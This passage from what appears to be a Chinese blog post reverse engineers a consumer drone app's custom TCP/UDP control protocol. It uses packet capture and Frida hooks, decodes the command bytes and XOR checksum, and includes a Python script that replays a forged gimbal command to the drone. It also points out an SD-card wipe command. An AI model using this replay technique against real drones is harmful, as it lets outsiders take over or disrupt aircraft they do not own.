listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes</span><br><span class="line">^C10270 packets captured</span><br><span class="line">10370 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line">bullhead:/data/local/tmp # exit</span><br><span class="line">bullhead:/ $ exit                                                           </span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# adb pull /sdcard/sjf/capture.pcap                                            </span><br><span class="line">/sdcard/capture.pcap: 1 file pulled, .... 12.9 MB/s (2595261 bytes in 0.191s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>抓包后再用Wireshark查看，发现捕获到大量的UDP和TCP等协议。</p><img src="/posts/ac4cb042/6.1.1.png" class=""><p>然而并分析不出什么，因为是厂商自定义的协议，Wireshark解析不了。看能不能定位到App发送TCP/UDP给无人机的那部分代码，或无人机里固件对应的代码。</p><p>使用<a href="https://v5le0n9.github.io/posts/bdcbf47.html">网络通信协议分析</a>这篇文章的hook脚本，可以知道该自定义协议本质上是用了Java层的<code>socketRead0()</code>和<code>socketWrite0()</code>（TCP），还有<code>sendtoBytes()</code>和<code>recvfromBytes()</code>（UDP）进行通信，查看调用栈定位到App中的代码。</p><p>TCP：</p><img src="/posts/ac4cb042/6.1.2.png" class=""><img src="/posts/ac4cb042/6.1.3.png" class=""><img src="/posts/ac4cb042/6.1.4.png" class=""><p>UDP：</p><img src="/posts/ac4cb042/6.1.5.png" class=""><h2 id="6-1-TCP"><a href="#6-1-TCP" class="headerlink" title="6.1 TCP"></a>6.1 TCP</h2><p>经过分析Java代码发现并没有进行加解密算法，而是直接将数据进行发送和接收。由于主要分析App向无人机发送命令，可以以TCP的<code>write()</code>为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ArrayBlockingQueue&lt;<span class="type">byte</span>[]&gt; f3987d = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(f3985b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">b</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">        b() &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// java.lang.Thread, java.lang.Runnable</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.run();</span><br><span class="line">            <span class="keyword">while</span> (f.<span class="built_in">this</span>.f3988e != <span class="literal">null</span> &amp;&amp; f.<span class="built_in">this</span>.f3988e.isConnected()) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!f.<span class="built_in">this</span>.f3987d.isEmpty()) &#123;</span><br><span class="line">                        <span class="comment">//不能深入到socketWrite0()就找谁调用了它</span></span><br><span class="line">                        <span class="comment">//发现是由java.net.SocketOutputStream.write(byte[])调用的</span></span><br><span class="line">                        <span class="comment">//也就是下面这个混淆过的函数</span></span><br><span class="line">                        f.<span class="built_in">this</span>.f.write((<span class="type">byte</span>[]) f.<span class="built_in">this</span>.f3987d.poll());</span><br><span class="line">                        f.<span class="built_in">this</span>.f.flush();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">10L</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            f.<span class="built_in">this</span>.f3987d.clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>write()</code>把字节数组通过TCP协议发了出去，所以这个字节数组是什么呢？<a href="https://blog.csdn.net/u014799292/article/details/90167096">ArrayBlockingQueue详解</a>，它里面有几个重要的方法，比如<code>poll()</code>和<code>offer()</code>。<code>offer()</code>的功能是将数据加到 BlockingQueue 里，如果 BlockingQueue 可以容纳，则返回 true，否则返回 false。搜索一下这个阻塞式的队列<code>offer()</code>方法，果然是有的：</p><img src="/posts/ac4cb042/6.1.6.png" class=""><p>查看哪里调用了<code>o()</code>方法，有以下两处：</p><img src="/posts/ac4cb042/6.1.7.png" class=""><p>其中第二处的参数固定，并且有定时器，很有可能是充当心跳包。所以还是主要分析第一处。</p><img src="/posts/ac4cb042/6.1.8.png" class=""><p>第一处是被<code>I()</code>调用了，并且数据是<code>I()</code>的参数，所以继续查看哪里调用了<code>I()</code>方法：</p><img src="/posts/ac4cb042/6.1.9.png" class=""><h3 id="6-1-1-当前经纬度数据"><a href="#6-1-1-当前经纬度数据" class="headerlink" title="6.1.1 当前经纬度数据"></a>6.1.1 当前经纬度数据</h3><p>第一个，应该是控制无人机在设定好的经纬度飞行。</p><img src="/posts/ac4cb042/6.1.11.png" class=""><h3 id="6-1-2-云台角度调节"><a href="#6-1-2-云台角度调节" class="headerlink" title="6.1.2 云台角度调节"></a>6.1.2 云台角度调节</h3><p>第二个，看不出来什么。</p><img src="/posts/ac4cb042/6.1.12.png" class=""><p>查看哪里调用了<code>d0()</code>，发现恰好是控制界面中的<code>onClick()</code>调用了它：</p><img src="/posts/ac4cb042/6.1.13.png" class=""><p>点击其中一个，发现它是跟云台的角度调节有关的，所以当我们使用App调节云台角度时，它是通过这些代码来发送TCP数据包，让云台执行命令。</p><img src="/posts/ac4cb042/6.1.14.png" class=""><img src="/posts/ac4cb042/6.1.15.png" class=""><p>分析到这里，我们是不是可以使用hook <code>d0()</code>方法，先查看它的参数与返回值，在此基础上修改它的参数与返回值，从而达到不点击App上的按钮，就可以实现调节云台角度的功能呢？</p><p>查看参数与返回值，由于<code>d0()</code>方法没有返回值，所以只看参数就好了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookd0</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//静态处理</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.g.a.h.f&quot;</span>).<span class="property">d0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg1</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1 =&gt; &quot;</span>, arg1);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">d0</span>(arg1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过实验，每按一次减号键参数递增5，每按一次加号键参数递减5，并且云台角度确实上下变换。</p><img src="/posts/ac4cb042/6.1.16.png" class=""><p>接下来直接在js代码中修改参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookd0</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.g.a.h.f&quot;</span>).<span class="property">d0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg1</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1 =&gt; &quot;</span>, arg1);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">d0</span>(<span class="number">80</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现不能自行改变云台角度，需要按加或减按钮一下才能执行到我们修改的参数的角度，再次按加或减按钮不改变角度，固定在了80。因为上面这个写法，是需要触发条件的，而触发条件就是点击按钮。要想绕过触发条件，就必须进行主动调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookd0</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.g.a.h.f&quot;</span>).<span class="property">d0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg1</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1 =&gt; &quot;</span>,arg1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">invoked0</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//静态处理</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.g.a.h.f&quot;</span>).<span class="title function_">d0</span>(<span class="number">80</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hookd0)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frida -FU -l d0.js</span><br><span class="line">invoked0()</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/6.1.18.png" class=""><p>我主动调用了<code>d0()</code>，为什么打印不了上面的参数信息？疑惑。</p><p>主动调用还可以这样写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">invoked0</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//静态处理</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.g.a.h.f&quot;</span>).<span class="title function_">d0</span>(<span class="number">80</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//脚本跑起来3s后执行函数invoked0</span></span><br><span class="line"><span class="built_in">setTimeout</span>(invoked0, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -FU -l d0.js</span><br></pre></td></tr></table></figure><p>这样就可以实现无需点击按钮，发送云台调节命令的TCP数据包。</p><p>但是它发送的数据包具体内容是什么呢？仔细看<code>d0()</code>代码，发现要发送的数据包会对bArr字节数组的某些元素进行异或运算。再进入<code>I()</code>方法，里面有一个判断，如果<code>i.m().p()</code>为true则进入<code>i.m().z(bArr)</code>方法；否则直接将bArr这5或6字节数组通过TCP发送。</p><p>我们可以抓一下云台角度调节的正常包，验证我们的猜想。搜索<code>d0()</code>方法中传过去的字节数组，开头3字节固定为<code>68 07 01</code>。</p><img src="/posts/ac4cb042/6.1.17.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">68 07 01 05 03</span><br><span class="line">68 07 01 0a 0c</span><br><span class="line">68 07 01 0f 09</span><br><span class="line">68 07 01 14 12</span><br><span class="line">68 07 01 19 1f</span><br><span class="line">68 07 01 1e 18</span><br><span class="line">68 07 01 23 25</span><br><span class="line">68 07 01 28 2e</span><br></pre></td></tr></table></figure><p>第4字节从代码中就能看出是传入的参数，也就是递增或递减5。最后发现第5字节是第2~4字节的异或运算，原来bArr字节数组就是传过去的数据本身。</p><p>进而尝试使用Python构造TCP包，重放看是否能调节云台角度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;680701&quot;</span>+<span class="string">&quot;28&quot;</span>+<span class="string">&quot;2e&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;680701&quot;+&quot;03&quot;+&quot;00&quot;</span></span><br><span class="line">payload = unhexlify(payload)</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;172.16.10.1&#x27;</span>,<span class="number">8888</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>没得问题，成功！重放的话，即使不是递增递减5，只要符合规则，也是可以调节角度的。</p><h3 id="6-1-3-设备升级"><a href="#6-1-3-设备升级" class="headerlink" title="6.1.3 设备升级"></a>6.1.3 设备升级</h3><p>第三第四个，查看哪里调用了<code>b()</code>和<code>c()</code>。</p><img src="/posts/ac4cb042/6.2.3.png" class=""><img src="/posts/ac4cb042/6.2.1.png" class=""><img src="/posts/ac4cb042/6.2.2.png" class=""><p>从文字分析应该是有关设备升级代码，可以不管。可以通过调用这个下载病毒或木马不？（bushi</p><h3 id="6-1-4-设置中的参数栏"><a href="#6-1-4-设置中的参数栏" class="headerlink" title="6.1.4 设置中的参数栏"></a>6.1.4 设置中的参数栏</h3><p>第五第六个非常相似，都是跟“设置”相关的。</p><img src="/posts/ac4cb042/6.2.5.png" class=""><img src="/posts/ac4cb042/6.2.4.png" class=""><p>从第六个调用地的变量j、a2、c2、e2可以知道，它们分别是“设置”中参数栏下的新手模式、总飞行距离、飞行高度、返航高度。</p><img src="/posts/ac4cb042/6.2.6.png" class=""><p>要想修改其中的数值，直接修改它们的返回值即可。要想知道数据包的内容，与6.1.2同样方法求得。（或许吧）</p><p>同样可以继续深入查看调用，其中发现姿态模式的控制页面调用了它。</p><img src="/posts/ac4cb042/6.2.7.png" class=""><p>而第五个应该是与初始化相关？</p><h3 id="6-1-5-时间"><a href="#6-1-5-时间" class="headerlink" title="6.1.5 时间"></a>6.1.5 时间</h3><p>第七第八个是发送与时间相关数据包：</p><img src="/posts/ac4cb042/6.2.8.png" class=""><img src="/posts/ac4cb042/6.2.9.png" class=""><p>顺着一路往上追可以追到快门键，感兴趣可以追一下。</p><img src="/posts/ac4cb042/6.2.10.png" class=""><h3 id="6-1-6-航点"><a href="#6-1-6-航点" class="headerlink" title="6.1.6 航点"></a>6.1.6 航点</h3><p>最后一个：</p><img src="/posts/ac4cb042/6.1.10.png" class=""><p>对列表中的每个元素进行遍历，每个循环中创建一个长度为16的字节数组，前3个字节固定值，转换成十六进制为<code>68 04 0C</code>。定义了一个<code>LGFlyLineBean</code>类，里面存的是每个元素的经纬度、元素下标、高度、速度和时间。再将这个<code>LGFlyLineBean</code>类通过<code>convertFlyLine()</code>这个Native方法转换为字节数组。<code>arraycopy()</code>方法将convertFlyLine字节数组从下标为0开始复制到bArr数组下标为3的地址，复制长度为convertFlyLine字节数组的长度，结合下面的异或运算可以猜测长度为12，bArr字节数组下标为15的元素是下标为1~14的异或结果。最后将bArr字节数组通过TCP发送到无人机。</p><p>继续不停往上查看调用，最后发现是<code>R.id.s1</code>按钮调用的它。</p><img src="/posts/ac4cb042/6.2.11.png" class=""><p><code>R.id.s1</code>的解析可以看5.1.2，它应该是进入航线规划后的“GO”按钮。其中列表的每个元素就是每个设置好的航点。</p><h2 id="6-2-UDP"><a href="#6-2-UDP" class="headerlink" title="6.2 UDP"></a>6.2 UDP</h2><p>UDP也是用阻塞式的队列<code>offer()</code>方法来将数据加入队列。这里面的参数非常明显了，字节数组、字节数组的长度、对端IP、对端端口。发现有两个调用：</p><img src="/posts/ac4cb042/6.3.2.png" class=""><p>先来看第一个。</p><img src="/posts/ac4cb042/6.3.1.png" class=""><img src="/posts/ac4cb042/6.3.3.png" class=""><p>这个应该是设置中继的IP和端口？？</p><blockquote><p>中继器（RP repeater）工作于OSI的物理层，是局域网上所有节点的中心，它的作用是放大信号，补偿信号衰减，支持远距离的通信。</p></blockquote><p>继续看第二个，默认以端口8080发送UDP数据。</p><img src="/posts/ac4cb042/6.3.4.png" class=""><p>可以发现发送的数据很多都是以<code>ff 53 54</code>开头的，抓的包也有很多这些数据。我们先看。</p><h3 id="6-2-1-c-g-a-h-f"><a href="#6-2-1-c-g-a-h-f" class="headerlink" title="6.2.1 c.g.a.h.f"></a>6.2.1 c.g.a.h.f</h3><p>在<code>c.g.a.h.f</code>类中的，往上跟会发现大多是在进行初始化操作。</p><img src="/posts/ac4cb042/6.3.5.png" class=""><img src="/posts/ac4cb042/6.3.6.png" class=""><img src="/posts/ac4cb042/6.3.7.png" class=""><p>再看这个类中的<code>N()</code>、<code>U()</code>、<code>e0()</code>。<code>N()</code>和<code>U()</code>在同一个方法中被调用，只是所需的前提条件不一样，而且它们内部执行流程也不一样。</p><img src="/posts/ac4cb042/6.3.8.png" class=""><img src="/posts/ac4cb042/6.3.9.png" class=""><p>暂时还不知道有什么用，看不懂。<code>e0()</code>也看不出什么，真是醉了。</p><img src="/posts/ac4cb042/6.3.10.png" class=""><p>继续看这个类中的<code>g0()</code>，发现终于有点提示了。</p><img src="/posts/ac4cb042/6.3.11.png" class=""><p>查看<code>g0()</code>有两处调用，o.f5360a=128，o.f5361b=5，即每按一次左或右，在初始值128的基础上递增或递减5，区间范围在0~255之间。</p><img src="/posts/ac4cb042/6.3.12.png" class=""><p>抓包发现App向无人机发送数据，无人机返回同样的数据给App。</p><img src="/posts/ac4cb042/6.3.13.png" class=""><p>再看<code>h0()</code>，结合App中的信息，可以知道这个是“设置”中图像栏的SD卡分辨率，默认为4K，也就是常量3，常量1表示为2.7K。</p><img src="/posts/ac4cb042/6.3.14.png" class=""><img src="/posts/ac4cb042/6.3.15.png" class=""><h3 id="6-2-2-c-g-a-l"><a href="#6-2-2-c-g-a-l" class="headerlink" title="6.2.2 c.g.a.l"></a>6.2.2 c.g.a.l</h3><p>c.g.a.l.d</p><p>c.g.a.l.e</p><p>c.g.a.l.f</p><p>c.g.a.l.g</p><p>c.g.a.l.h</p><p>c.g.a.l.i</p><h3 id="6-2-3-c-g-a-m-q"><a href="#6-2-3-c-g-a-m-q" class="headerlink" title="6.2.3 c.g.a.m.q"></a>6.2.3 c.g.a.m.q</h3><p>这个类中的<code>a()</code>方法是删除SD卡中所有内容。</p><p><code>b()</code>方法是获取SD卡的状态和容量。</p><h3 id="6-2-4-c-i-a-f-b"><a href="#6-2-4-c-i-a-f-b" class="headerlink" title="6.2.4 c.i.a.f.b"></a>6.2.4 c.i.a.f.b</h3><p><code>B()</code>方法，包中的数据以“D”开头：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">B</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    K((<span class="string">&quot;D&quot;</span> + str).getBytes());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>追踪到最后发现这个方法是设置国家码之类的。</p><img src="/posts/ac4cb042/6.3.16.png" class=""><p>而<code>F()</code>、<code>G()</code>、<code>H()</code>是使用UDP发的来表示时间的方法。</p><img src="/posts/ac4cb042/6.3.17.png" class=""><p>而<code>g.run()</code>方法，只发送了一个字节<code>42</code>(“B”)，抓包时可以抓到这个包，但是使用jadx查看用例却溯源不了。暂时放弃。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">g</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    g() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// java.lang.Thread, java.lang.Runnable</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.run();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            i--;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                b.<span class="built_in">this</span>.K(<span class="string">&quot;B&quot;</span>.getBytes());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">300L</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e2) &#123;</span><br><span class="line">                    e2.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>k()</code>方法也同样溯源不了，只发了一个字节<code>47</code>(“G”)。</p><p><code>l()</code>方法，如果设备型号和设备ID都为空，发送一个字节<code>0f</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">l</span><span class="params">()</span> &#123;</span><br><span class="line">    K(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">15</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/6.3.18.png" class=""><img src="/posts/ac4cb042/6.3.19.png" class=""><p><code>o()</code>方法发送一个字节<code>28</code>。</p><p><code>p()</code>方法发送一个字节<code>2c</code>。</p><p><code>x()</code>方法发送当前日期和时间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">x</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">format</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis()));</span><br><span class="line">    K((<span class="string">&quot;date -s \&quot;&quot;</span> + format + <span class="string">&quot;\&quot;&quot;</span>).getBytes());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上这些方法都追不到调用地，但抓包时都抓到了，很可能是初始化时发送的。</p><img src="/posts/ac4cb042/6.3.20.png" class=""><h3 id="6-2-5-c-i-a-g-a"><a href="#6-2-5-c-i-a-g-a" class="headerlink" title="6.2.5 c.i.a.g.a"></a>6.2.5 c.i.a.g.a</h3><p><code>b.run()</code>在判断数据流是JPEG格式还是H264格式。如果是H264格式需要解码。其中<code>getOneFrame()</code>和<code>decodeH264()</code>都是JNI函数。发送一个字节<code>27</code>。</p><img src="/posts/ac4cb042/6.3.21.png" class=""><h3 id="6-2-6-c-i-a-g-e"><a href="#6-2-6-c-i-a-g-e" class="headerlink" title="6.2.6 c.i.a.g.e"></a>6.2.6 c.i.a.g.e</h3><p><code>a.run()</code>跟进去发现是跟定时器有关的，而e.f3977a是一个没有初始化的字节数组，所以传的是什么数据？</p><img src="/posts/ac4cb042/6.3.25.png" class=""><h3 id="6-2-7-c-i-a-k-a"><a href="#6-2-7-c-i-a-k-a" class="headerlink" title="6.2.7 c.i.a.k.a"></a>6.2.7 c.i.a.k.a</h3><p><code>C0121a.run()</code>方法传入的也是5字节数组，这里可以很清晰看出是获得当前IP地址并加上某些数据得到的数据包。这里也是充当一个定时器。</p><img src="/posts/ac4cb042/6.3.22.png" class=""><img src="/posts/ac4cb042/6.3.23.png" class=""><img src="/posts/ac4cb042/6.3.24.png" class=""><h3 id="6-2-8-com-sj-baselibrary-view-c"><a href="#6-2-8-com-sj-baselibrary-view-c" class="headerlink" title="6.2.8 com.sj.baselibrary.view.c"></a>6.2.8 com.sj.baselibrary.view.c</h3><p><code>a.run()</code>，很容易看出这个是在机器校准时进行的代码。</p><img src="/posts/ac4cb042/6.3.26.png" class=""><h3 id="6-2-9-com-sj-baselibrary-view-g"><a href="#6-2-9-com-sj-baselibrary-view-g" class="headerlink" title="6.2.9 com.sj.baselibrary.view.g"></a>6.2.9 com.sj.baselibrary.view.g</h3><p><code>g()</code>、<code>h()</code>、<code>i()</code>中参数初始化值都为128。</p><img src="/posts/ac4cb042/6.3.27.png" class=""><img src="/posts/ac4cb042/6.3.28.png" class=""><p>看不懂这是哪里的拖动条，又是什么意思。</p><h3 id="6-2-10-com-vison-macrochip-sj-gps-pro-activity-b"><a href="#6-2-10-com-vison-macrochip-sj-gps-pro-activity-b" class="headerlink" title="6.2.10 com.vison.macrochip.sj.gps.pro.activity.b"></a>6.2.10 com.vison.macrochip.sj.gps.pro.activity.b</h3><p><code>k()</code>方法很容易知道是环绕飞行的操作。</p><img src="/posts/ac4cb042/6.3.29.png" class=""><h1 id="7-第三种思路"><a href="#7-第三种思路" class="headerlink" title="7. 第三种思路"></a>7. 第三种思路</h1><p>由于我们已经知道在App中进行操作所发送的TCP/UDP包是自定义协议，并且自定义协议是通过Java代码中一些字节数组实现，那我们是不是可以通过抓到的TCP/UDP包，来实现Java代码的定位呢？通过分析数据包发现，一般如果数据多于3个字节，那么数据的前3个字节是固定的。</p><p> 依照这个思路，可以抓相关飞控、图传之类的数据包。</p><h2 id="7-1-飞控"><a href="#7-1-飞控" class="headerlink" title="7.1 飞控"></a>7.1 飞控</h2><p>航线规划</p><p>兴趣点环绕（环绕半径）</p><p>GPS跟随</p><p>图像跟随</p><p>自动起飞</p><p>自动返航</p><h2 id="7-2-图传"><a href="#7-2-图传" class="headerlink" title="7.2 图传"></a>7.2 图传</h2><h3 id="7-2-1-拍照"><a href="#7-2-1-拍照" class="headerlink" title="7.2.1 拍照"></a>7.2.1 拍照</h3><p>进行了两次拍照，一次使用App，一次使用遥控器。</p><img src="/posts/ac4cb042/7.2.1.png" class=""><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">b</span><span class="params">()</span> &#123;</span><br><span class="line">    g.f(<span class="string">&quot;--获取状态和容量--&quot;</span>);</span><br><span class="line">    f.O().K(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">1</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">1</span>&#125;);</span><br><span 